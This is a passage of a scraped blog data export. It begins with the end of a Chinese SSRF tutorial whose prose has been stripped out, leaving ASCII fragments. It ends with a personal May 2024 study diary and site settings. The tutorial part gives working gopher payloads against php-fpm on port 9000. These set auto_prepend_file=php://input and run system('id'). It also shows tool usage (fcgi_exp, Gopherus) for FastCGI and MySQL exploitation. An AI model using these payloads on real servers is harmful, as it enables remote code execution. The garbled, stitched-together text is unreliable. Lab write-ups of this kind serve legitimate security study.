\\_\\_name\\_\\_==&quot;\\_\\_main\\_\\_&quot;:</span><br><span class=\"line\">\tfor x in cmd:</span><br><span class=\"line\">\t\tpayload += urllib.quote(redis\\_format(x))</span><br><span class=\"line\">\tprint payload</span><br></pre></td></tr></table></figure>\n\n<p>payloadurlUbuntuSSRF192.168.52.131vpsshell</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202362.jpeg\"\n                        alt=\"image-20210113184927766\"\n                 ></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/qq_45521281/article/details/106532501\" >[GKCTF2020]EZ-EzWeb<i class=\"fas fa-external-link-alt\"></i></a>Redis</p>\n<h2 id=\"FastCGI\"><a href=\"#FastCGI\" class=\"headerlink\" title=\"FastCGI\"></a>FastCGI</h2><p>FastCGIFast Common Gateway InterfaceFastCGIWebFastCGICGIFastCGICGI</p>\n<blockquote>\n<p><strong></strong><strong></strong>ApacheWebCGICGIPHPPHPphp.iniCGIWeb serverPHP Web</p>\n<p>CGIFastCGICGICGI<strong>CGI</strong><strong>FastCGICGI</strong> </p>\n</blockquote>\n<h3 id=\"php-fpm\"><a href=\"#php-fpm\" class=\"headerlink\" title=\"php-fpm\"></a>php-fpm</h3><p>FPMFastCGI FastCGI PHP FastCGI </p>\n<p>FastCGI<code>SCRIPT_FILENAME&#39;: &#39;/var/www/html/index.php</code>php-fpmphp-fpm</p>\n<p>PHP 5.3.9PHPphp-fpmphpphp4PHPPHP_ADMIN_VALUEPHP_VALUEPHP</p>\n<p>PHP<code>auto_prepend_file = php://input;allow_url_include = On</code>PHP<code>auto_prepend_file</code><code>php://input</code>POSTFastCGIbodyphp-fpm</p>\n<p><a class=\"link\"   href=\"https://bbs.ichunqiu.com/thread-58455-1-1.html\" >SSRFFastCGI<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202250.jpeg\"\n                        alt=\"image-20210113225311760\"\n                 ></p>\n<p>WEBUbuntu192.168.43.166SSRF</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598034_5fffc69243862a502d80a.png!small\"\n                        alt=\"image-20210113211319025\"\n                 ></p>\n<p>WEBUbuntuFastCGISSRFFastCGI</p>\n<blockquote>\n<p>fpm0.0.0.0:9000php-fpmSSRF9000php-fpmfcgi_expphp-fpm</p>\n<p>fpm0.0.0.0:9000php-fpmUbuntuSSRFphp-fpmUbuntuSSRF</p>\n</blockquote>\n<h3 id=\"fcgi-exp\"><a href=\"#fcgi-exp\" class=\"headerlink\" title=\"fcgi_exp\"></a>fcgi_exp</h3><p><a class=\"link\"   href=\"https://github.com/piaca/fcgi_exp\" >https://github.com/piaca/fcgi_exp<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>php-fpmphp-fpmpayload</p>\n<p>go</p>\n<p>go build fcgi_exp.go                    # fcgi_exp.go</p>\n<p><code>nc -lvvp 2333 &gt; fcg_exp.txt</code>2333 fcgi_exppayload2333payload</p>\n<p>.&#x2F;fcgi_exp system 127.0.0.1 2333 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php id</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202135.jpeg\"\n                        alt=\"image-20210113205718209\"\n                 ></p>\n<p>fcg_exp.txtpayload</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598036_5fffc694cc3e3da7a21ec.png!small\"\n                        alt=\"image-20210113205857913\"\n                 ></p>\n<p>fcg_exp.txtpayloadurl</p>\n<p># -*- coding: UTF-8 -*-<br>from urllib.parse import quote, unquote, urlencode  </p>\n<p>file &#x3D; open(fcg_exp.txt,r)<br>payload &#x3D; file.read()<br>print(gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_+quote(payload).replace(%0A,%0D).replace(%2F,&#x2F;))</p>\n<p>pythonpayload</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202737.jpeg\"\n                        alt=\"image-20210113210102251\"\n                 ></p>\n<p>payloadurlpayload?url&#x3D;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2514%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP%2F1.1%250E%2502CONTENT\\_LENGTH56%250E%2504REQUEST\\_METHODPOST%2509%255BPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Ddisable\\_functions%2520%253D%2520%250Dsafe\\_mode%2520%253D%2520Off%250Dauto\\_prepend\\_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT\\_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT\\_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2500%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----0vcdb34oju09b8fd-----%250D%2527%2529%253B%253F%253E</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598040_5fffc6982e020c76d98d2.png!small\"\n                        alt=\"image-20210113211227610\"\n                 ></p>\n<h3 id=\"Gopherus\"><a href=\"#Gopherus\" class=\"headerlink\" title=\"Gopherus\"></a>Gopherus</h3><p><a class=\"link\"   href=\"https://github.com/tarunkant/Gopherus\" >https://github.com/tarunkant/Gopherus<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>GopherpayloadSSRFRedisFastCGIMySql</p>\n<p>GopherusFastCGIpayload</p>\n<p>python gopherus.py exploit fastcgi<br>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php    # php<br>id    # </p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598041_5fffc69924b889c84f935.png!small\"\n                        alt=\"image-20201206134630782\"\n                 ></p>\n<p>payloadurlpayload?url&#x3D;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssrf.php?url=gopher%3A//127.0.0.1%3A9000/\\_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER\\_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE\\_ADDR127.0.0.1%250F%2508SERVER\\_PROTOCOLHTTP/1.1%250E%2502CONTENT\\_LENGTH54%250E%2504REQUEST\\_METHODPOST%2509KPHP\\_VALUEallow\\_url\\_include%2520%253D%2520On%250Adisable\\_functions%2520%253D%2520%250Aauto\\_prepend\\_file%2520%253D%2520php%253A//input%250F%2517SCRIPT\\_FILENAME/var/www/html/index.php%250D%2501DOCUMENT\\_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202253.jpeg\"\n                        alt=\"image-20210113211649519\"\n                 ></p>\n<p></p>\n<h2 id=\"MySql\"><a href=\"#MySql\" class=\"headerlink\" title=\"MySql\"></a>MySql</h2><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202474.jpeg\"\n                        alt=\"20210113152106.png\"\n                 ></p>\n<p>MySqlMySQLMySQL &#x2F; (scramble)</p>\n<p>(scramble)Gopher</p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598044_5fffc69c8db745aea464b.png!small\"\n                        alt=\"image-20210113225607672\"\n                 ></p>\n<p>UbuntuWEBSSRFMySqlwhoami</p>\n<p>GopherusUbuntuMySqlpayload</p>\n<p>python gopherus.py exploit mysql<br>whoami    # <br>show databases;    # sql</p>\n<p>payload</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598046_5fffc69e8d085bc01c7a3.png!small\"\n                        alt=\"image-20210114004602164\"\n                 ></p>\n<p>paylaodurlpayload?url&#x3D;</p>\n<h2 id=\"Ending\"><a href=\"#Ending\" class=\"headerlink\" title=\"Ending\"></a>Ending</h2><p>SSRF</p>\n<ul>\n<li>ssrf-lab<a class=\"link\"   href=\"https://github.com/fengwenhua/ssrf-lab\" >https://github.com/fengwenhua/ssrf-lab<i class=\"fas fa-external-link-alt\"></i></a></li>\n</ul>\n<p> REST API  WebHook  SSRF <a class=\"link\"   href=\"https://www.heibai.org/post/1287.html\" >https://www.heibai.org/post/1287.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202809.jpeg\"\n                        alt=\"20210112124413.jpg\"\n                 ></p>\n<p></p>\n<p><a class=\"link\"   href=\"https://whoamianony.top/\" >https://whoamianony.top/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<blockquote>\n<p> <a class=\"link\"   href=\"https://blog.csdn.net/Ping_Pig/article/details/99412487\" >https://blog.csdn.net/Ping_Pig&#x2F;article&#x2F;details&#x2F;99412487<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/iors/p/9777571.html\" >https://www.cnblogs.com/iors/p/9777571.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/qq_43625917/article/details/104528645?utm_source=app\" >https://blog.csdn.net/qq_43625917&#x2F;article&#x2F;details&#x2F;104528645?utm_source&#x3D;app<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://xz.aliyun.com/t/2115\" >https://xz.aliyun.com/t/2115<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_36343353/article/details/112277580\" >https://blog.csdn.net/weixin_36343353&#x2F;article&#x2F;details&#x2F;112277580<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/cj_Allen/article/details/106855893\" >https://blog.csdn.net/cj_Allen&#x2F;article&#x2F;details&#x2F;106855893<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/#Redis%E9%85%8D%E5%90%88gopher%E5%8D%8F%E8%AE%AE%E8%BF%9B%E8%A1%8CSSRF\" >https://www.redteaming.top/2019/07/15/RedisSSRF/#RedisgopherSSRF<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://bbs.ichunqiu.com/thread-58455-1-1.html\" >https://bbs.ichunqiu.com/thread-58455-1-1.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.chaitin.cn/gopher-attack-surfaces/\" >https://blog.chaitin.cn/gopher-attack-surfaces/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.anquanke.com/post/id/197431#h2-6\" >https://www.anquanke.com/post/id/197431#h2-6<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.anquanke.com/post/id/145519#h2-14\" >https://www.anquanke.com/post/id/145519#h2-14<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n"},{"title":"2024 May","date":"2024-04-30T16:00:00.000Z","excerpt":"May","_content":"\n\n\n# 2024 May\n\n\n\n## 5.6\n\n\n\nwjh13h+\n\n\n\n### Math\n\n-   p177\n\n\n\n### English\n\n- 100x\n\n\n\n### 408\n\n- kmp\n\n\n\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405062129332.PNG\" alt=\"IMG_2889\" style=\"zoom: 33%;\" />\n\n\n\n\n\n\n\n## 5.7\n\n\n\n\n\n\n\n### Math\n\n- 9 p186\n\n\n\n\n\n### English\n\n-  50\n\n\n\n\n\n### 408\n\n-  p145\n\n408408\n\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405072120518.png\" style=\"zoom:33%;\" />\n\n\n\n\n\n## 5.8\n\nisccflagwjh,\n\n\n\n### Math\n\n- \n-  p190\n\n\n\n### English\n\n- 50\n\n\n\n### 408\n\n- 5.3 p155\n\n \n\n\n\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405082148032.PNG\" alt=\"IMG_2897\" style=\"zoom:33%;\" />\n\n\n\n\n\n\n\n## 5.9\n\n\n\n\n\n8\n\n\n\n### Math\n\n-  p200\n- \n\n\n\n\n\n\n\n\n\n### English\n\n- 60+52 /43min\n\n\n\n1h+100+100\n\n\n\n### 408\n\n-   p183\n\n\n\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405092137009.PNG\" alt=\"IMG_2901\" style=\"zoom:33%;\" />\n\n\n\n\n\n\n\n## 5.10\n\n\n\n\n\n\n\n\n\n### Math\n\n- \n\n\n\n\n\n\n\n### English\n\n- \n\n\n\n\n\n\n\n\n\n### 408\n\n- \n\n\n\n\n\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405102248015.PNG\" alt=\"IMG_2913\" style=\"zoom:33%;\" />\n\n\n\n\n\n\n\n## 5.11\n\n- \n\n![IMG_2925(1)](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121701561.JPG)\n\n- ktv\n\n\n\n\n\n\n\n## 5.12\n\n\n\nweb\n\n\n\n\n\n![Xnip2024-05-12_12-42-33](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121704922.jpg)\n\n\n\n![4e462780ed0f89e5da35f90564ba25be](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121707685.jpg)\n\n...\n\n\n\n\n\n## 5.13\n\n\n\n\n","source":"_posts/May.md","raw":"---\ntitle: 2024 May\ndate: 2024-05-01 00:00:00\nexcerpt: May\ncategories: \n---\n\n\n\n# 2024 May\n\n\n\n## 5.6\n\n\n\nwjh13h+\n\n\n\n### Math\n\n-   p177\n\n\n\n### English\n\n- 100x\n\n\n\n### 408\n\n- kmp\n\n\n\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405062129332.PNG\" alt=\"IMG_2889\" style=\"zoom: 33%;\" />\n\n\n\n\n\n\n\n## 5.7\n\n\n\n\n\n\n\n### Math\n\n- 9 p186\n\n\n\n\n\n### English\n\n-  50\n\n\n\n\n\n### 408\n\n-  p145\n\n408408\n\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405072120518.png\" style=\"zoom:33%;\" />\n\n\n\n\n\n## 5.8\n\nisccflagwjh,\n\n\n\n### Math\n\n- \n-  p190\n\n\n\n### English\n\n- 50\n\n\n\n### 408\n\n- 5.3 p155\n\n \n\n\n\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405082148032.PNG\" alt=\"IMG_2897\" style=\"zoom:33%;\" />\n\n\n\n\n\n\n\n## 5.9\n\n\n\n\n\n8\n\n\n\n### Math\n\n-  p200\n- \n\n\n\n\n\n\n\n\n\n### English\n\n- 60+52 /43min\n\n\n\n1h+100+100\n\n\n\n### 408\n\n-   p183\n\n\n\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405092137009.PNG\" alt=\"IMG_2901\" style=\"zoom:33%;\" />\n\n\n\n\n\n\n\n## 5.10\n\n\n\n\n\n\n\n\n\n### Math\n\n- \n\n\n\n\n\n\n\n### English\n\n- \n\n\n\n\n\n\n\n\n\n### 408\n\n- \n\n\n\n\n\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405102248015.PNG\" alt=\"IMG_2913\" style=\"zoom:33%;\" />\n\n\n\n\n\n\n\n## 5.11\n\n- \n\n![IMG_2925(1)](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121701561.JPG)\n\n- ktv\n\n\n\n\n\n\n\n## 5.12\n\n\n\nweb\n\n\n\n\n\n![Xnip2024-05-12_12-42-33](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121704922.jpg)\n\n\n\n![4e462780ed0f89e5da35f90564ba25be](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121707685.jpg)\n\n...\n\n\n\n\n\n## 5.13\n\n\n\n\n","slug":"May","published":1,"updated":"2024-05-13T15:16:46.973Z","_id":"clvv05u7500006y7648fcbq3l","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-May\"><a href=\"#2024-May\" class=\"headerlink\" title=\"2024 May\"></a>2024 May</h1><h2 id=\"5-6\"><a href=\"#5-6\" class=\"headerlink\" title=\"5.6\"></a>5.6</h2><p>wjh13h+</p>\n<h3 id=\"Math\"><a href=\"#Math\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li>  p177</li>\n</ul>\n<h3 id=\"English\"><a href=\"#English\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li>100x</li>\n</ul>\n<h3 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li>kmp</li>\n</ul>\n<p></p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405062129332.PNG\"\n                         alt=\"IMG_2889\" style=\"zoom: 33%;\" \n                 >\n\n\n\n\n\n\n\n<h2 id=\"5-7\"><a href=\"#5-7\" class=\"headerlink\" title=\"5.7\"></a>5.7</h2><p></p>\n<h3 id=\"Math-1\"><a href=\"#Math-1\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li>9 p186</li>\n</ul>\n<p></p>\n<h3 id=\"English-1\"><a href=\"#English-1\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li> 50</li>\n</ul>\n<p></p>\n<h3 id=\"408-1\"><a href=\"#408-1\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li> p145</li>\n</ul>\n<p>408408</p>\n<p></p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405072120518.png\"\n                         style=\"zoom:33%;\" \n                 >\n\n\n\n\n\n<h2 id=\"5-8\"><a href=\"#5-8\" class=\"headerlink\" title=\"5.8\"></a>5.8</h2><p>isccflagwjh,</p>\n<h3 id=\"Math-2\"><a href=\"#Math-2\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li></li>\n<li> p190</li>\n</ul>\n<h3 id=\"English-2\"><a href=\"#English-2\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li>50</li>\n</ul>\n<h3 id=\"408-2\"><a href=\"#408-2\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li>5.3 p155</li>\n</ul>\n<p> </p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405082148032.PNG\"\n                         alt=\"IMG_2897\" style=\"zoom:33%;\" \n                 >\n\n\n\n\n\n\n\n<h2 id=\"5-9\"><a href=\"#5-9\" class=\"headerlink\" title=\"5.9\"></a>5.9</h2><p></p>\n<p></p>\n<p>8</p>\n<h3 id=\"Math-3\"><a href=\"#Math-3\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li> p200</li>\n<li></li>\n</ul>\n<p></p>\n<p></p>\n<h3 id=\"English-3\"><a href=\"#English-3\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li>60+52 &#x2F;43min</li>\n</ul>\n<p>1h+100+100</p>\n<h3 id=\"408-3\"><a href=\"#408-3\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li>  p183</li>\n</ul>\n<p></p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405092137009.PNG\"\n                         alt=\"IMG_2901\" style=\"zoom:33%;\" \n                 >\n\n\n\n\n\n\n\n<h2 id=\"5-10\"><a href=\"#5-10\" class=\"headerlink\" title=\"5.10\"></a>5.10</h2><p></p>\n<h3 id=\"Math-4\"><a href=\"#Math-4\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li></li>\n</ul>\n<p></p>\n<h3 id=\"English-4\"><a href=\"#English-4\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li></li>\n</ul>\n<p></p>\n<h3 id=\"408-4\"><a href=\"#408-4\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li></li>\n</ul>\n<p></p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405102248015.PNG\"\n                         alt=\"IMG_2913\" style=\"zoom:33%;\" \n                 >\n\n\n\n\n\n\n\n<h2 id=\"5-11\"><a href=\"#5-11\" class=\"headerlink\" title=\"5.11\"></a>5.11</h2><ul>\n<li></li>\n</ul>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121701561.JPG\"\n                        alt=\"IMG_2925(1)\"\n                 ></p>\n<ul>\n<li>ktv</li>\n</ul>\n<h2 id=\"5-12\"><a href=\"#5-12\" class=\"headerlink\" title=\"5.12\"></a>5.12</h2><p></p>\n<p>web</p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121704922.jpg\"\n                        alt=\"Xnip2024-05-12_12-42-33\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121707685.jpg\"\n                        alt=\"4e462780ed0f89e5da35f90564ba25be\"\n                 ></p>\n<p></p>\n<h2 id=\"5-13\"><a href=\"#5-13\" class=\"headerlink\" title=\"5.13\"></a>5.13</h2><p></p>\n<p></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]},"cdn":{"enable":true,"provider":"jsdelivr"}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"2024-May\"><a href=\"#2024-May\" class=\"headerlink\" title=\"2024 May\"></a>2024 May</h1><h2 id=\"5-6\"><a href=\"#5-6\" class=\"headerlink\" title=\"5.6\"></a>5.6</h2><p>wjh13h+</p>\n<h3 id=\"Math\"><a href=\"#Math\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li>  p177</li>\n</ul>\n<h3 id=\"English\"><a href=\"#English\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li>100x</li>\n</ul>\n<h3 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li>kmp</li>\n</ul>\n<p></p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405062129332.PNG\"\n                         alt=\"IMG_2889\" style=\"zoom: 33%;\" \n                 >\n\n\n\n\n\n\n\n<h2 id=\"5-7\"><a href=\"#5-7\" class=\"headerlink\" title=\"5.7\"></a>5.7</h2><p></p>\n<h3 id=\"Math-1\"><a href=\"#Math-1\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li>9 p186</li>\n</ul>\n<p></p>\n<h3 id=\"English-1\"><a href=\"#English-1\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li> 50</li>\n</ul>\n<p></p>\n<h3 id=\"408-1\"><a href=\"#408-1\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li> p145</li>\n</ul>\n<p>408408</p>\n<p></p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405072120518.png\"\n                         style=\"zoom:33%;\" \n                 >\n\n\n\n\n\n<h2 id=\"5-8\"><a href=\"#5-8\" class=\"headerlink\" title=\"5.8\"></a>5.8</h2><p>isccflagwjh,</p>\n<h3 id=\"Math-2\"><a href=\"#Math-2\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li></li>\n<li> p190</li>\n</ul>\n<h3 id=\"English-2\"><a href=\"#English-2\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li>50</li>\n</ul>\n<h3 id=\"408-2\"><a href=\"#408-2\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li>5.3 p155</li>\n</ul>\n<p> </p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405082148032.PNG\"\n                         alt=\"IMG_2897\" style=\"zoom:33%;\" \n                 >\n\n\n\n\n\n\n\n<h2 id=\"5-9\"><a href=\"#5-9\" class=\"headerlink\" title=\"5.9\"></a>5.9</h2><p></p>\n<p></p>\n<p>8</p>\n<h3 id=\"Math-3\"><a href=\"#Math-3\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li> p200</li>\n<li></li>\n</ul>\n<p></p>\n<p></p>\n<h3 id=\"English-3\"><a href=\"#English-3\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li>60+52 &#x2F;43min</li>\n</ul>\n<p>1h+100+100</p>\n<h3 id=\"408-3\"><a href=\"#408-3\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li>  p183</li>\n</ul>\n<p></p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405092137009.PNG\"\n                         alt=\"IMG_2901\" style=\"zoom:33%;\" \n                 >\n\n\n\n\n\n\n\n<h2 id=\"5-10\"><a href=\"#5-10\" class=\"headerlink\" title=\"5.10\"></a>5.10</h2><p></p>\n<h3 id=\"Math-4\"><a href=\"#Math-4\" class=\"headerlink\" title=\"Math\"></a>Math</h3><ul>\n<li></li>\n</ul>\n<p></p>\n<h3 id=\"English-4\"><a href=\"#English-4\" class=\"headerlink\" title=\"English\"></a>English</h3><ul>\n<li></li>\n</ul>\n<p></p>\n<h3 id=\"408-4\"><a href=\"#408-4\" class=\"headerlink\" title=\"408\"></a>408</h3><ul>\n<li></li>\n</ul>\n<p></p>\n<img    \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405102248015.PNG\"\n                         alt=\"IMG_2913\" style=\"zoom:33%;\" \n                 >\n\n\n\n\n\n\n\n<h2 id=\"5-11\"><a href=\"#5-11\" class=\"headerlink\" title=\"5.11\"></a>5.11</h2><ul>\n<li></li>\n</ul>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202405121701561.JPG\"\n                        alt=\"IMG_2925(1)\"\n                 